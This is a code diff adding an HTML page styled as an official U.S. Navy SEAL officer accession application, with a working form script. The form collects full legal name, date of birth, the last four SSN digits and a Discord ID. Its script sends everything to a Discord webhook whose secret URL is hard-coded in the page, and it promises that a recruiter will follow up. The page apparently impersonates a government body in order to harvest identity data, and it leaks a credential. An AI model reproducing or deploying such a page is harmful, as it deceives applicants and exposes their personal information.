@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>United States Naval Special Warfare SEAL Officer Application</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="//fonts.googleapis.com/css?family=Raleway:400,300,600" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="css/normalize.css">
+  <link rel="stylesheet" href="css/skeleton.css">
+  <link rel="stylesheet" href="apply.css">
+  <link rel="icon" type="image/png" href="trident.png">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { font-size: 55%; }
+    body { font-size: 1.3rem; animation: none; }
+    .container { max-width: 960px; padding: 10px; }
+    h1, h2, p, ul, li, label, input, select, textarea { font-size: 1.3rem; }
+    h1 { font-size: 4em; margin-bottom: 1rem; text-align: center; }
+    h4 { font-size: 1.6rem; margin-bottom: 1rem; }
+    p { margin-bottom: 1rem; }
+    img { width: 60px; margin: 10px auto; display: block; }
+    form { margin-top: 1rem; }
+    .form-section { margin-bottom: 2rem; }
+    input, select, textarea { margin-bottom: 0.8rem; }
+    hr { margin: 2rem 0; }
+    .button-primary { padding: 8px 16px; font-size: 1.2rem; }
+    label small { display: block; font-weight: normal; color: #666; }
+  </style>
+</head>
+<body>
+  <div class="container">
+        <div id="notification" style="
+            display: none;
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #004085;
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            font-size: 1.4rem;
+            z-index: 1000;
+            transition: opacity 0.5s ease;
+        "></div>
+
+    <img src="trident.png" alt="NSW Trident">
+    <h1>SEAL Accession Application</h1>
+
+    <form>
+      <div class="form-section">
+        <h4>Personal Information</h4>
+
+        <div class="row">
+          <div class="six columns">
+            <label for="full-name">Full Legal Name <small>As listed on government-issued identification.</small></label>
+            <input class="u-full-width" type="text" id="full-name" name="full-name" required>
+          </div>
+
+          <div class="six columns">
+            <label for="discord-id">Discord ID <small>Used for preliminary communications. Format: 735947953497</small></label>
+            <input class="u-full-width" type="text" id="discord-id" name="discord-id" required>
+          </div>
+        </div>
+
+        <div class="row">
+          <div class="six columns">
+            <label for="dob">Date of Birth <small>Format: YYYY-MM-DD</small></label>
+            <input class="u-full-width" type="date" id="dob" name="dob" required>
+          </div>
+
+          <div class="six columns">
+            <label for="ssn">SSN (Last 4 Digits) <small>Used for identity verification purposes only.</small></label>
+            <input class="u-full-width" type="text" id="ssn" name="ssn" maxlength="4" required>
+          </div>
+        </div>
+
+        <div class="row">
+          <div class="twelve columns">
+            <label for="citizenship">Proof of U.S. Citizenship <small>Required to hold a U.S. security clearance.</small></label>
+            <select class="u-full-width" id="citizenship" name="citizenship" required>
+              <option value="">Select an option</option>
+              <option value="birth">Birth Certificate</option>
+              <option value="passport">U.S. Passport</option>
+              <option value="naturalization">Naturalization Certificate</option>
+            </select>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <h4>Military Qualifications</h4>
+
+        <div class="row">
+          <div class="six columns">
+            <label for="commission-source">Commissioning Source <small>Identify your officer accession pathway.</small></label>
+            <select class="u-full-width" id="commission-source" name="commission-source" required>
+              <option value="">Select an option</option>
+              <option value="usna">United States Naval Academy</option>
+              <option value="rotc">NROTC</option>
+              <option value="ocs">Officer Candidate School (OCS)</option>
+            </select>
+          </div>
+
+          <div class="six columns">
+            <label for="pfa-score">Most Recent PRT/PFA Composite Score <small>Used to assess physical fitness baseline.</small></label>
+            <input class="u-full-width" type="text" id="pfa-score" name="pfa-score" required>
+          </div>
+        </div>
+
+        <div class="row">
+          <div class="six columns">
+            <label for="asvab">ASVAB GT Score <small>General Technical score for eligibility screening.</small></label>
+            <input class="u-full-width" type="number" id="asvab" name="asvab" required>
+          </div>
+
+          <div class="six columns">
+            <label for="swcc-screening">Completed SEAL Officer Screening Assessment (SOSA) <small>Mandatory for SEAL officer consideration.</small></label>
+            <select class="u-full-width" id="swcc-screening" name="swcc-screening" required>
+              <option value="">Select an option</option>
+              <option value="yes">Yes</option>
+              <option value="no">No</option>
+            </select>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <h4>Operational Intent</h4>
+
+        <label for="motivation">Statement of Motivation <small>Describe why you seek accession into NSW. 500 words max.</small></label>
+        <textarea class="u-full-width" id="motivation" name="motivation" maxlength="3000" required></textarea>
+
+        <label for="career-plan">Career Plan (1-10 Year Outlook) <small>Outline intended operational and leadership development goals.</small></label>
+        <textarea class="u-full-width" id="career-plan" name="career-plan" maxlength="3000" required></textarea>
+
+        <label for="background">Prior Tactical/Leadership Experience <small>Include any relevant military or leadership experience.</small></label>
+        <textarea class="u-full-width" id="background" name="background" maxlength="3000"></textarea>
+      </div>
+
+      <div class="form-section">
+        <h4>Authorization</h4>
+        <p style="font-size:1.2rem;">By submitting this application, you acknowledge that successful accession is contingent upon your unwavering dedication to a rigorous and extensive Naval Special Warfare training pipeline. Commitment to the full length of the qualification process is mandatory. Falsification may result in disqualification and punitive action under the Uniform Code of Military Justice (UCMJ).</p>
+      </div>
+
+      <input class="button-primary" type="submit" value="Submit Application">
+    </form>
+  </div>
+  <script>
+    function showNotification(message, success = true) {
+  const notification = document.getElementById('notification');
+  notification.textContent = message;
+  notification.style.background = success ? '#004085' : '#721c24';
+  notification.style.display = 'block';
+  notification.style.opacity = '1';
+
+  setTimeout(() => {
+    notification.style.opacity = '0';
+    setTimeout(() => {
+      notification.style.display = 'none';
+    }, 500);
+  }, 4000);
+}
+    document.querySelector('form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+  
+      const webhookURL = "https://discord.com/api/webhooks/1327096542913626144/fHBfvcgXWzy8TeOd7THtc6Y8X-tHqj5k6iQVjReoaW9PyqwaDS-6fZMAYJui701dBgRm";
+  
+      // Get form data
+      const fullName = document.getElementById('full-name').value.trim();
+      const discordId = document.getElementById('discord-id').value.trim();
+      const dob = document.getElementById('dob').value.trim();
+      const ssn = document.getElementById('ssn').value.trim();
+      const citizenship = capitalizeFirst(document.getElementById('citizenship').value.trim());
+      const commissionSource = capitalizeFirst(document.getElementById('commission-source').value.trim());
+      const pfaScore = document.getElementById('pfa-score').value.trim();
+      const asvab = document.getElementById('asvab').value.trim();
+      const swccScreening = capitalizeFirst(document.getElementById('swcc-screening').value.trim());
+      const motivation = document.getElementById('motivation').value.trim().slice(0, 1024);
+      const careerPlan = document.getElementById('career-plan').value.trim().slice(0, 1024);
+      const background = document.getElementById('background').value.trim().slice(0, 1024);
+  
+      const payload = {
+        embeds: [
+          {
+            title: "SEAL Officer Accession Application",
+            color: 16777215,
+            description: `**Applicant:** <@${discordId}>`,
+            fields: [
+              { name: "Full Legal Name", value: fullName || "N/A", inline: false },
+              { name: "Date of Birth", value: dob || "N/A", inline: true },
+              { name: "SSN (Last 4)", value: ssn || "N/A", inline: true },
+              { name: "Citizenship", value: citizenship || "N/A", inline: true },
+              { name: "Commissioning Source", value: commissionSource || "N/A", inline: true },
+              { name: "PRT/PFA Score", value: pfaScore || "N/A", inline: true },
+              { name: "ASVAB GT Score", value: asvab || "N/A", inline: true },
+              { name: "SOSA Completed", value: swccScreening || "N/A", inline: true },
+              { name: "Statement of Motivation", value: motivation || "N/A", inline: false },
+              { name: "Career Plan (1-10 Years)", value: careerPlan || "N/A", inline: false },
+              { name: "Prior Tactical/Leadership Experience", value: background || "N/A", inline: false }
+            ],
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+  
+      try {
+        const response = await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+  
+        if (response.ok) {
+        showNotification('Application submitted successfully. A recruiter will reach out to you soon.');
+          document.querySelector('form').reset();
+        } else {
+        showNotification('Failed to submit application.', false);
+        }
+      } catch (error) {
+        showNotification('An unexpected error occurred.', false);
+      }
+    });
+  
+    function capitalizeFirst(text) {
+      if (!text) return text;
+      return text.charAt(0).toUpperCase() + text.slice(1).toLowerCase();
+    }
+  </script>
+  
+  
+    
+    
+</body>
+</html>
